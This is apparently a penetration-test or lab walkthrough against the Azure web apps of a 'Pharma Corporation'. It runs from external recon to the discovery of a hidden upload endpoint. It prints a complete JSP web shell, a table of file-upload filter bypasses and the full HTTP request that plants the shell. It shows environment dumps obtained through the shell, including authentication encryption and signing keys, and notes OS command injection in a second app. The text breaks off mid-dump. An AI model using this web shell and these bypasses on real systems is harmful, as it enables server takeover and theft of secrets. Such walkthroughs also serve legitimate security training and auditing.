# 1. External Recon
- The auditor performs external reconnaissance of the target organization using **AADInternals**.
```powershell
PS C:\Auditor> Import-Module .\AADInternals\AADInternals\0.6.8\AADInternals.psd1
PS C:\Auditor> Invoke-AADIntReconAsOutsider -DomainName pharmacorphq.onmicrosoft.com
Tenant brand:       Pharma Corporation
Tenant name:        pharmacorphq
Tenant id:          e0f999c1-86ee-47a0-bfd5-18470154b7cd
DesktopSSO enabled: False


Name  : pharmacorphq.onmicrosoft.com
DNS   : True
MX    : True
SPF   : True
DMARC : False
Type  : Managed
STS   :
```

- The auditor is provided with the `pharmacorp` base domain name and performs subdomain enumeration of public Azure services of the target organization.
```powershell
PS C:\Auditor> Import-Module .\MicroBurst\MicroBurst.psm1
PS C:\Auditor> Invoke-EnumerateAzureSubDomains -Base pharmacorp

Subdomain                                 Service
---------                                 -------
contactpharmacorp.azurewebsites.net       App Services
resourcespharmacorp.azurewebsites.net     App Services
resourcespharmacorp.scm.azurewebsites.net App Services - Management
contactpharmacorp.scm.azurewebsites.net   App Services - Management
pharmacorp.mail.protection.outlook.com    Email
pharmacorp.onmicrosoft.com                Microsoft Hosted Domain
pharmacorp-web.sharepoint.com             SharePoint
pharmacorp-my.sharepoint.com              SharePoint
pharmacorp.sharepoint.com                 SharePoint
```

# App Service 1 Enumeration & Exploitation - `contactpharmacorp`
- This web app has a contact form. The auditor tries various payloads for SQLi, OS Command Injection, XSS and other known OWASP10 attacks in the fields.
- The auditor takes a look at the source code of this page, discovering a comment that reveals a hidden directory, `/upload`.
```html
<snip>

|   |
|---|
|<!-- =======================================================|
||* Method Name: openUploadForm - v2.3.0|
||* Action value: /upload|
||* Author: John Doe|
||* Change request number: AWS/FREE/01CR02|
||========================================================|
|||
||<script>|
|||
||function openUploadForm(){|
|||
|||
||var form = document.getElementById("UploadForm");|
||form.action = '/upload';|
||form.submit();|
|||
|||
||}|
|||
|||
||</script>|

<snip>
```

- There is an upload form which the auditor can test for File Upload Vulnerabilities. Since this is a Java web application, the auditor will use a `.jsp` web shell that can be executed in the backend server.
```java
<%@ page
import="java.util.*,java.io.*"%>
<%
%>
<HTML>
<BODY>
<H3>JSP SHELL</H3>
<FORM METHOD="GET" NAME="myform"
ACTION="">
<INPUT TYPE="text" NAME="evil">
<INPUT TYPE="submit" VALUE="Pwn">
</FORM>
<PRE>
<%
if (request.getParameter("evil") != null) {
out.println("Command: " +
request.getParameter("evil") + "<BR>");
Process p =
Runtime.getRuntime().exec(request.getParameter("evil"));
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
}
%>
</PRE>
</BODY>
</HTML>
```

- The auditor checks the client-side filtering.
```javascript

		function uploadDocFunction() {

			var fileAttached = document.getElementById('vpnConfigFile').files[0];

			if (typeof fileAttached === "undefined") {

				alert("Please attach a file");

			}

/* 			if ("" != document.getElementById('vpnConfigFile').files[0].name) {

				var fileName = document.getElementById('vpnConfigFile').files[0].name;

				var re = /(?:\.([^.]+))?$/;

				if (re.exec(fileName)[1] != "zip") {

					alert("Only zip format allowed");

					return false;
				}

			} */

			var fileInput = document.getElementById('vpnConfigFile');
			var file = fileInput.files[0];

			
			
			
			var formData = new FormData();

			formData.append('file', file);
			formData.append(file.name,name);

			var xhttp = new XMLHttpRequest();
			xhttp.onreadystatechange = function() {

				if (this.readyState == 4 && this.status == 200) {
					var resTxt = xhttp.responseText;
					var tempArrResTxt = resTxt.split("~");

					var status = tempArrResTxt[0];

					if (status == "uploaded") {

						alert(status);

					} else {

						alert("error");

					}

				}
			};

			xhttp.open("POST", ''
					+ "/upload?action=upload&callType=ajax", true);

			xhttp.send(formData);

		}
```

- There does not seem to be any kind of client-side filtering, since the script does the following:
	1. It starts by getting the file attached by the user through an input field with the id `vpnConfigFile`. If no file is attached (`fileAttached` is undefined), it shows an alert asking the user to attach a file.
	2. It then creates a new `FormData` object and appends the file to it using the `append()` method.
	3. It creates an XMLHttpRequest object (`xhttp`) to handle the AJAX request.
	4. It defines an `onreadystatechange` event handler for the XMLHttpRequest object. This handler function checks if the request is complete and successful (readyState == 4 and status == 200). If it is, it processes the response.
	5. Inside the event handler, it retrieves the response text from the XMLHttpRequest object and splits it using the tilde (~) delimiter.
	6. It checks the status of the response. If the status is "uploaded", it shows an alert with the message "uploaded". Otherwise, it shows an alert with the message "error".
	7. Finally, it opens a POST request to the server (the URL is constructed dynamically) and sends the FormData object (`formData`) containing the file to be uploaded.
	8. There's a commented-out block of code that seems to be intended for checking the file extension (to ensure it's a ZIP file) but is currently inactive.

- The upload of the `.jsp` file fails because of the server-side filtering. The auditor tries various bypasses.

| **Command**                                                                                                                                | **Description**                              |
| ------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------- |
| **Client-Side Bypass**                                                                                                                     |                                              |
| `[CTRL+SHIFT+C]`                                                                                                                           | Toggle Page Inspector                        |
| **Blacklist Bypass**                                                                                                                       |                                              |
| `shell.phtml`                                                                                                                              | Uncommon Extension                           |
| `shell.pHp`                                                                                                                                | Case Manipulation                            |
| [PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) | List of PHP Extensions                       |
| [ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)                | List of ASP Extensions                       |
| [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)                          | List of Web Extensions                       |
| **Whitelist Bypass**                                                                                                                       |                                              |
| `shell.jpg.php`                                                                                                                            | Double Extension                             |
| `shell.php.jpg`                                                                                                                            | Reverse Double Extension                     |
| `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `'`, `…`                                                                                     | Character Injection - Before/After Extension |
| **Content/Type Bypass**                                                                                                                    |                                              |
| [Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)                             | List of Web Content-Types                    |
| [Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)                    | List of All Content-Types                    |
| [File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)                                                                   | List of File Signatures/Magic Bytes          |
- The auditor can bypass the extension filtering on the server side using the `'` on it.
```http
POST /upload?action=upload&callType=ajax HTTP/1.1
Host: contactpharmacorp.azurewebsites.net
Connection: close
Content-Length: 974
sec-ch-ua: "Chromium";v="89", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAlkAEB5H0cUnLkgf
Accept: */*
Origin: https://contactpharmacorp.azurewebsites.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://contactpharmacorp.azurewebsites.net/upload
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=DACC257433B8325C86F27FA753B20846; ARRAffinity=664cff65fb0830a8f00d20cbb06260ad645f7e6c54f889f5a82e638267647ba0; ARRAffinitySameSite=664cff65fb0830a8f00d20cbb06260ad645f7e6c54f889f5a82e638267647ba0

------WebKitFormBoundaryAlkAEB5H0cUnLkgf
Content-Disposition: form-data; name="file"; filename="student105.j's'p"
Content-Type: application/octet-stream

<%@ page
import="java.util.*,java.io.*"%>
<%
%>
<HTML>
<BODY>
<H3>JSP SHELL</H3>
<FORM METHOD="GET" NAME="myform"
ACTION="">
<INPUT TYPE="text" NAME="evil">
<INPUT TYPE="submit" VALUE="Pwn">
</FORM>
<PRE>
<%
if (request.getParameter("evil") != null) {
out.println("Command: " +
request.getParameter("evil") + "<BR>");
Process p =
Runtime.getRuntime().exec(request.getParameter("evil"));
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
}
%>
</PRE>
</BODY>
</HTML>
------WebKitFormBoundaryAlkAEB5H0cUnLkgf
Content-Disposition: form-data; name="student105.j's'p"


------WebKitFormBoundaryAlkAEB5H0cUnLkgf--
```

- The auditor can access the web shell to execute OS commands at `https://contactpharmacorp.azurewebsites.net/student105.jsp`. Using the `cmd /c set` command the auditor can list the environment variables to discover various sensitive information.
```cmd
ACTION=start
AZURE_ENV_INITIALIZED=C:\Program Files\apache-tomcat-9.0.83\bin\
AZURE_LOGGING_DIR=C:\home/LogFiles
AZURE_SITE_APP_BASE=C:\home/site/wwwroot/webapps
AZURE_SITE_HOME=C:\home
AZURE_SITE_LIBS_DIR=C:\home/site/libs
AZURE_UNPACK_WARS=true
CATALINA_BASE=C:\Program Files\apache-tomcat-9.0.83
CATALINA_HOME=C:\Program Files\apache-tomcat-9.0.83
CATALINA_LOGGING_CONFIG=-Djava.util.logging.config.file="C:\Program Files\apache-tomcat-9.0.83\conf\logging.properties"
CATALINA_OPTS= -DuseEncodedApplogs=true
CATALINA_TMPDIR=C:\local\Temp
CLASSPATH=C:\Program Files\apache-tomcat-9.0.83\lib\servlet-api.jar;C:\Program Files\apache-tomcat-9.0.83\lib\azure.appservice.jar;C:\Program Files\apache-tomcat-9.0.83\bin\bootstrap.jar;C:\Program Files\apache-tomcat-9.0.83\bin\tomcat-juli.jar
CURRENT_DIR=C:\home\site\wwwroot
ENDORSED_PROP=ignore.endorsed.dirs
JAVA_OPTS=-Dcatalina.valves.showReport=False -Dcatalina.valves.showServerInfo=False -Dcatalina.maxConnections=10000 -Dcatalina.maxThreads=200  -Dsite.logdir=C:/home/LogFiles -Dsite.home=C:/home -Dsite.libs=C:/home/site/libs -Dsite.appbase=C:/home/site/wwwroot/webapps -Dsite.xmlbase=C:/home/site/wwwroot -Dsite.unpackwars=true -Dsite.tempdir=C:\local\Temp -Dcatalina.instance.name=664cff65fb0830a8f00d20cbb06260ad645f7e6c54f889f5a82e638267647ba0 -Dport.http=21089 -Djava.net.preferIPv4Stack=true -noverify -Dsite.logRetentionDays=1 -Dsite.logRotatable=true -Dsite.connectionTimeout=220000 -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
JAVA_TMP_DIR=C:\local\Temp
JDK_JAVA_OPTIONS= --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED --add-opens=java.base/java.util.concurrent=ALL-UNNAMED --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED
JRE_HOME=C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u392
JSSE_OPTS=-Djdk.tls.ephemeralDHKeySize=2048
LOGGING_MANAGER=-Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
MAINCLASS=org.apache.catalina.startup.Bootstrap
PROMPT=$P$G
SystemDrive=C:
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 85 Stepping 7, GenuineIntel
DOTNET_HOSTING_OPTIMIZATION_CACHE=C:\DotNetCache
PROCESSOR_ARCHITECTURE=AMD64
DriverData=C:\Windows\System32\Drivers\DriverData
Path=C:\Python27;C:\Program Files (x86)\nodejs;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files\Microsoft Network Monitor 3\;C:\Users\packer\AppData\Roaming\npm;C:\Program Files (x86)\nodejs\;C:\Program Files (x86)\Mercurial\;C:\Program Files\Git\cmd;C:\Program Files (x86)\Microsoft ASP.NET\ASP.NET Web Pages\v1.0\;C:\Program Files (x86)\dotnet;C:\Program Files\dotnet;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps;C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u392\bin;
AZURE_TOMCAT7_CMDLINE=-Dport.http=%HTTP_PLATFORM_PORT% -Djava.util.logging.config.file="C:\Program Files (x86)\apache-tomcat-7.0.94\conf\logging.properties" -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dsite.logdir="d:/home/LogFiles/" -Dsite.tempdir="d:\home\site\workdir" -classpath "C:\Program Files (x86)\apache-tomcat-7.0.94\bin\bootstrap.jar;C:\Program Files (x86)\apache-tomcat-7.0.94\bin\tomcat-juli.jar" -Dcatalina.base="C:\Program Files (x86)\apache-tomcat-7.0.94" -Djava.io.tmpdir="d:\home\site\workdir" org.apache.catalina.startup.Bootstrap
RoleInstanceId=dw1SmallDedicatedWebWorkerRole_8420
AZURE_TOMCAT85_CMDLINE="-noverify -Djava.net.preferIPv4Stack=true -Dcatalina.instance.name=%WEBSITE_INSTANCE_ID% -Dport.http=%HTTP_PLATFORM_PORT% -Djava.util.logging.config.file=\"C:\Program Files\apache-tomcat-8.5.57\conf\logging.properties\" -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dsite.logdir=\"%HOME%\LogFiles\\" -Dsite.tempdir=\"%HOME%\site\workdir\" -classpath \"C:\Program Files\apache-tomcat-8.5.57\bin\bootstrap.jar;C:\Program Files\apache-tomcat-8.5.57\bin\tomcat-juli.jar\" -Dcatalina.base=\"C:\Program Files\apache-tomcat-8.5.57\" -Djava.io.tmpdir=\"%HOME%\site\workdir\" org.apache.catalina.startup.Bootstrap"
AZURE_TOMCAT90_HOME=C:\Program Files\apache-tomcat-9.0.37
PROCESSOR_REVISION=5507
TEMP=C:\local\Temp
USERPROFILE=C:\local\UserProfile
USERNAME=dw1sdwk0006HW$
SystemRoot=C:\Windows
AZURE_TOMCAT85_HOME=C:\Program Files\apache-tomcat-8.5.57
AZURE_TOMCAT7_HOME=C:\Program Files (x86)\apache-tomcat-7.0.94
AZURE_JETTY9_CMDLINE=-Djava.net.preferIPv4Stack=true -Djetty.port=%HTTP_PLATFORM_PORT% -Djetty.base="D:\Program Files (x86)\jetty-distribution-9.1.0.v20131115" -Djetty.webapps="d:\home\site\wwwroot\webapps" -jar "D:\Program Files (x86)\jetty-distribution-9.1.0.v20131115\start.jar" etc\jetty-logging.xml
CommonProgramFiles=C:\Program Files\Common Files
ProgramData=C:\local\ProgramData
AZURE_JETTY93_HOME=C:\Program Files (x86)\jetty-distribution-9.3.25.v20180904
COMPUTERNAME=dw1sdwk0006HW
RoleName=dw1SmallDedicatedWebWorkerRole
AZURE_TOMCAT10_HOME=C:\Program Files\apache-tomcat-10.1.16
CommonProgramW6432=C:\Program Files\Common Files
AZURE_JETTY9_HOME=C:\Program Files (x86)\jetty-distribution-9.1.0.v20131115
AZURE_TOMCAT90_CMDLINE="-noverify -Djava.net.preferIPv4Stack=true -Dcatalina.instance.name=%WEBSITE_INSTANCE_ID% -Dport.http=%HTTP_PLATFORM_PORT% -Djava.util.logging.config.file=\"C:\Program Files\apache-tomcat-9.0.37\conf\logging.properties\" -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dsite.logdir=\"%HOME%\LogFiles\\" -Dsite.tempdir=\"%HOME%\site\workdir\" -classpath \"C:\Program Files\apache-tomcat-9.0.37\bin\bootstrap.jar;C:\Program Files\apache-tomcat-9.0.37\bin\tomcat-juli.jar\" -Dcatalina.base=\"C:\Program Files\apache-tomcat-9.0.37\" -Djava.io.tmpdir=\"%HOME%\site\workdir\" org.apache.catalina.startup.Bootstrap"
TMP=C:\local\Temp
RoleRoot=E:
AZURE_JETTY93_CMDLINE=-Djava.net.preferIPv4Stack=true -Djetty.port=%HTTP_PLATFORM_PORT% -Djetty.base="D:\Program Files (x86)\jetty-distribution-9.3.25.v20180904" -Djetty.webapps="d:\home\site\wwwroot\webapps" -jar "D:\Program Files (x86)\jetty-distribution-9.3.25.v20180904\start.jar" etc\jetty-logging.xml
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
AZURE_TOMCAT10_CMDLINE=-noverify -Djava.net.preferIPv4Stack=true -Dcatalina.instance.name=%WEBSITE_INSTANCE_ID% -Dport.http=%HTTP_PLATFORM_PORT% -Djava.util.logging.config.file="C:\Program Files\apache-tomcat-10.1.16\conf\logging.properties" -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dsite.logdir="d:/home/LogFiles/" -Dsite.tempdir="d:\home\site\workdir" -classpath "C:\Program Files\apache-tomcat-10.1.16\bin\bootstrap.jar;C:\Program Files\apache-tomcat-10.1.16\bin\tomcat-juli.jar" -Dcatalina.base="C:\Program Files\apache-tomcat-10.1.16" -Djava.io.tmpdir="d:\home\site\workdir" org.apache.catalina.startup.Bootstrap
WEBSITE_CATALINA_MAXCONNECTIONS=10000
WEBSITE_CATALINA_MAXTHREADS=200
WEBSITE_TOMCAT_CONNECTION_TIMEOUT=220000
WEBSITE_TOMCAT_LOGS_ROTATABLE=true
windir=C:\Windows
NUMBER_OF_PROCESSORS=1
OS=Windows_NT
ProgramFiles=C:\Program Files
ComSpec=C:\Windows\system32\cmd.exe
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL;.PY;.PYW
AZURE_TOMCAT8_CMDLINE=-Dport.http=%HTTP_PLATFORM_PORT% -Djava.util.logging.config.file="C:\Program Files (x86)\apache-tomcat-8.0.53\conf\logging.properties" -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dsite.logdir="d:/home/LogFiles/" -Dsite.tempdir="d:\home\site\workdir" -classpath "C:\Program Files (x86)\apache-tomcat-8.0.53\bin\bootstrap.jar;C:\Program Files (x86)\apache-tomcat-8.0.53\bin\tomcat-juli.jar" -Dcatalina.base="C:\Program Files (x86)\apache-tomcat-8.0.53" -Djava.io.tmpdir="d:\home\site\workdir" org.apache.catalina.startup.Bootstrap
ALLUSERSPROFILE=C:\local\ProgramData
PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files\WindowsPowerShell\Modules\;C:\Program Files (x86)\Microsoft SDKs\Azure\PowerShell\ResourceManager\AzureResourceManager\;C:\Program Files (x86)\Microsoft SDKs\Azure\PowerShell\ServiceManagement\;C:\Program Files (x86)\Microsoft SDKs\Azure\PowerShell\Storage\
APPDATA=C:\local\AppData
USERDOMAIN=WORKGROUP
PROCESSOR_LEVEL=6
LOCALAPPDATA=C:\local\LocalAppData
ResourceDrive=D:\
AZURE_TOMCAT8_HOME=C:\Program Files (x86)\apache-tomcat-8.0.53
PUBLIC=C:\Users\Public
AnalyticsAppServiceEndpoint=https://analytics.pharmacorphq.com/
APPSETTING_AnalyticsAppServiceEndpoint=https://analytics.pharmacorphq.com/
WEBSITE_HTTPLOGGING_RETENTION_DAYS=1
APPSETTING_WEBSITE_HTTPLOGGING_RETENTION_DAYS=1
ScmType=None
APPSETTING_ScmType=None
WEBSITE_SITE_NAME=contactpharmacorp
APPSETTING_WEBSITE_SITE_NAME=contactpharmacorp
WEBSITE_AUTH_ENABLED=False
APPSETTING_WEBSITE_AUTH_ENABLED=False
REMOTEDEBUGGINGVERSION=16.0.30709.132
APPSETTING_REMOTEDEBUGGINGVERSION=16.0.30709.132
FUNCTIONS_RUNTIME_SCALE_MONITORING_ENABLED=0
APPSETTING_FUNCTIONS_RUNTIME_SCALE_MONITORING_ENABLED=0
WEBSITE_AUTH_LOGOUT_PATH=/.auth/logout
APPSETTING_WEBSITE_AUTH_LOGOUT_PATH=/.auth/logout
WEBSITE_AUTH_AUTO_AAD=False
APPSETTING_WEBSITE_AUTH_AUTO_AAD=False
REGION_NAME=France Central
HOME=C:\home
HOME_EXPANDED=D:\DWASFiles\Sites\contactpharmacorp\VirtualDirectory0
LOCAL_EXPANDED=D:\DWASFiles\Sites\contactpharmacorp
windows_tracing_flags=
windows_tracing_logfile=
WEBSITE_INSTANCE_ID=664cff65fb0830a8f00d20cbb06260ad645f7e6c54f889f5a82e638267647ba0
WEBSITE_HTTPLOGGING_ENABLED=0
WEBSITE_SCM_ALWAYS_ON_ENABLED=1
WEBSITE_ISOLATION=pico
WEBSITE_OS=windows
WEBSITE_DEPLOYMENT_ID=contactpharmacorp
WEBSITE_INFRASTRUCTURE_IP=10.11.1.1
WEBSITE_COMPUTE_MODE=Dedicated
WEBSITE_SKU=Basic
WEBSITE_ELASTIC_SCALING_ENABLED=0
WEBSITE_SCM_SEPARATE_STATUS=1
WEBSITE_IIS_SITE_NAME=contactpharmacorp
WEBSITE_APPSERVICEAPPLOGS_TRACE_ENABLED=true
WEBSITE_CHANGEANALYSISSCAN_ENABLED=1
MicrosoftInstrumentationEngine_LatestPath=C:\Program Files (x86)\SiteExtensions\InstrumentationEngine\1.0.43
JAVA_HOME=C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u392
SITE_BITNESS=x86
WEBSITE_AUTH_ENCRYPTION_KEY=31C2C4A2E2448C4CDAA057A4C1E29F22C32164D5F03CD51652B338FB048A888F
WEBSITE_AUTH_SIGNING_KEY=E2D13052812E98A152DD6441BF4B62EC13F5A8F7E3F16FFEFD327172BA6DA179
WEBSITE_PROACTIVE_AUTOHEAL_ENABLED=True
WEBSITE_PROACTIVE_STACKTRACING_ENABLED=True
WEBSITE_PROACTIVE_CRASHMONITORING_ENABLED=True
WEBSITE_CRASHMONITORING_USE_DEBUGDIAG=True
WEBSITE_DYNAMIC_CACHE=1
WEBSITE_FRAMEWORK_JIT=1
WEBSITE_HOME_STAMPNAME=waws-prod-par-021
WEBSITE_CURRENT_STAMPNAME=waws-prod-par-021
WEBSOCKET_CONCURRENT_REQUEST_LIMIT=350
WEBSITE_VOLUME_TYPE=PrimaryStorageVolume
WEBSITE_OWNER_NAME=aac02f74-b0d2-45d2-8fbc-8d33f274116f+Analytics-FranceCentralwebspace
WEBSITE_RESOURCE_GROUP=analytics
WEBSITE_CONTAINER_READY=1
WEBSITE_PHYSICAL_MEMORY_MB=1996
WEBSITE_JAVA_MAX_HEAP_MB=1397
WEBSITE_STACK=TOMCAT
WEBSITE_PLATFORM_VERSION=101.1.7.100
REMOTEDEBUGGINGPORT=
REMOTEDEBUGGINGBITVERSION=vx86
WEBSITE_LOCALCACHE_ENABLED=False
WEBSITE_HOSTNAME=contactpharmacorp.azurewebsites.net
WEBSITE_RELAYS=
WEBSITE_REWRITE_TABLE=
HTTP_PLATFORM_PORT=21089
_EXECJAVA="C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u392\bin\java.exe"
_RUNJAVA=C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u392\bin\java.exe
_RUNJDB=C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u392\bin\jdb.exe
```

- The auditor discovers a new endpoint.
```
<snip>

AnalyticsAppServiceEndpoint=https://analytics.pharmacorphq.com/
APPSETTING_AnalyticsAppServiceEndpoint=https://analytics.pharmacorphq.com/

<snip>
```

- The auditor visits this endpoint to enumerate it. This web app has some calendar management functions. The auditor attempts to exploit them using various payloads, discovering that the `Category Name` field is vulnerable to OS Command Injection. Using the `cmd /c set` the auditor can list the environment variables.
```cmd
ACTION=startAZURE_ENV_INITIALIZED=C:\Program Files\apache-tomcat-9.0.83\bin\AZURE_LOGGING_DIR=C:\home/LogFilesAZURE_SITE_APP_BASE=C:\home/site/wwwroot/webappsAZURE_SITE_HOME=C:\homeAZURE_SITE_LIBS_DIR=C:\home/site/libsAZURE_UNPACK_WARS=trueCATALINA_BASE=C:\Program Files\apache-tomcat-9.0.83CATALINA_HOME=C:\Program Files\apache-tomcat-9.0.83CATALINA_LOGGING_CONFIG=-Djava.util.logging.config.file="C:\Program Files\apache-tomcat-9.0.83\conf\logging.properties"CATALINA_OPTS= -DuseEncodedApplogs=trueCATALINA_TMPDIR=C:\local\TempCLASSPATH=C:\Program Files\apache-tomcat-9.0.83\lib\servlet-api.jar;C:\Program Files\apache-tomcat-9.0.83\lib\azure.appservice.jar;C:\Program Files\apache-tomcat-9.0.83\bin\bootstrap.jar;C:\Program Files\apache-tomcat-9.0.83\bin\tomcat-juli.jarCURRENT_DIR=C:\home\site\wwwrootENDORSED_PROP=ignore.endorsed.dirsJAVA_OPTS=-Dcatalina.valves.showReport=False -Dcatalina.valves.showServerInfo=False -Dcatalina.maxConnections=10000 -Dcatalina.maxThreads=200  -Dsite.logdir=C:/home/LogFiles -Dsite.home=C:/home -Dsite.libs=C:/home/site/libs -Dsite.appbase=C:/home/site/wwwroot/webapps -Dsite.xmlbase=C:/home/site/wwwroot -Dsite.unpackwars=true -Dsite.tempdir=C:\local\Temp -Dcatalina.instance.name=664cff65fb0830a8f00d20cbb06260ad645f7e6c54f889f5a82e638267647ba0 -Dport.http=4431 -Djava.net.preferIPv4Stack=true -noverify -Dsite.logRetentionDays=0 -Dsite.logRotatable=true -Dsite.connectionTimeout=220000 -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresourcesJAVA_TMP_DIR=C:\local\TempJDK_JAVA_OPTIONS= --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED --add-opens=java.base/java.util.concurrent=ALL-UNNAMED --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMEDJRE_HOME=C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u392JSSE_OPTS=-Djdk.tls.ephemeralDHKeySize=2048LOGGING_MANAGER=-Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManagerMAINCLASS=org.apache.catalina.startup.BootstrapPROMPT=$P$GSystemDrive=C:ProgramFiles(x86)=C:\Program Files (x86)ProgramW6432=C:\Program FilesPROCESSOR_IDENTIFIER=Intel64 Family 6 Model 85 Stepping 7, GenuineIntelDOTNET_HOSTING_OPTIMIZATION_CACHE=C:\DotNetCachePROCESSOR_ARCHITECTURE=AMD64DriverData=C:\Windows\System32\Drivers\DriverDataPath=C:\Python27;C:\Program Files (x86)\nodejs;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files\Microsoft Network Monitor 3\;C:\Users\packer\AppData\Roaming\npm;C:\Program Files (x86)\nodejs\;C:\Program Files (x86)\Mercurial\;C:\Program Files\Git\cmd;C:\Program Files (x86)\Microsoft ASP.NET\ASP.NET Web Pages\v1.0\;C:\Program Files (x86)\dotnet;C:\Program Files\dotnet;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps;C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u392\bin;AZURE_TOMCAT7_CMDLINE=-Dport.http=%HTTP_PLATFORM_PORT% -Djava.util.logging.config.file="C:\Program Files (x86)\apache-tomcat-7.0.94\conf\logging.properties" -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dsite.logdir="d:/home/LogFiles/" -Dsite.tempdir="d:\home\site\workdir" -classpath "C:\Program Files (x86)\apache-tomcat-7.0.94\bin\bootstrap.jar;C:\Program Files (x86)\apache-tomcat-7.0.94\bin\tomcat-juli.jar" -Dcatalina.base="C:\Program Files (x86)\apache-tomcat-7.0.94" -Djava.io.tmpdir="d:\home\site\workdir" org.apache.catalina.startup.BootstrapRoleInstanceId=dw1SmallDedicatedWebWorkerRole_8420AZURE_TOMCAT85_CMDLINE="-noverify -Djava.net.preferIPv4Stack=true -Dcatalina.instance.name=%WEBSITE_INSTANCE_ID% -Dport.http=%HTTP_PLATFORM_PORT% -Djava.util.logging.config.file=\"C:\Program Files\apache-tomcat-8.5.57\conf\logging.properties\" -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dsite.logdir=\"%HOME%\LogFiles\\" -Dsite.tempdir=\"%HOME%\site\workdir\" -classpath \"C:\Program Files\apache-tomcat-8.5.57\bin\bootstrap.jar;C:\Program Files\apache-tomcat-8.5.57\bin\tomcat-juli.jar\" -Dcatalina.base=\"C:\Program Files\apache-tomcat-8.5.57\" -Djava.io.tmpdir=\"%HOME%\site\workdir\" org.apache.catalina.startup.Bootstrap"AZURE_TOMCAT90_HOME=C:\Program Files\apache-tomcat-9.0.37PROCESSOR_REVISION=5507TEMP=C:\local\TempUSERPROFILE=C:\local\UserProfileUSERNAME=dw1sdwk0006HW$SystemRoot=C:\WindowsAZURE_TOMCAT85_HOME=C:\Program Files\apache-tomcat-8.5.57AZURE_TOMCAT7_HOME=C:\Program Files (x86)\apache-tomcat-7.0.94AZURE_JETTY9_CMDLINE=-Djava.net.preferIPv4Stack=true -Djetty.port=%HTTP_PLATFORM_PORT% -Djetty.base="D:\Program Files (x86)\jetty-distribution-9.1.0.v20131115" -Djetty.webapps="d:\home\site\wwwroot\webapps" -jar "D:\Program Files (x86)\jetty-distribution-9.1.0.v20131115\start.jar" etc\jetty-logging.xmlCommonProgramFiles=C:\Program Files\Common FilesProgramData=C:\local\ProgramDataAZURE_JETTY93_HOME=C:\Program Files (x86)\jetty-distribution-9.3.25.v20180904COMPUTERNAME=dw1sdwk0006HWRoleName=dw1SmallDedicatedWebWorkerRoleAZURE_TOMCAT10_HOME=C:\Program Files\apache-tomcat-10.1.16CommonProgramW6432=C:\Program Files\Common FilesAZURE_JETTY9_HOME=C:\Program Files (x86)\jetty-distribution-9.1.0.v20131115AZURE_TOMCAT90_CMDLINE="-noverify -Djava.net.preferIPv4Stack=true 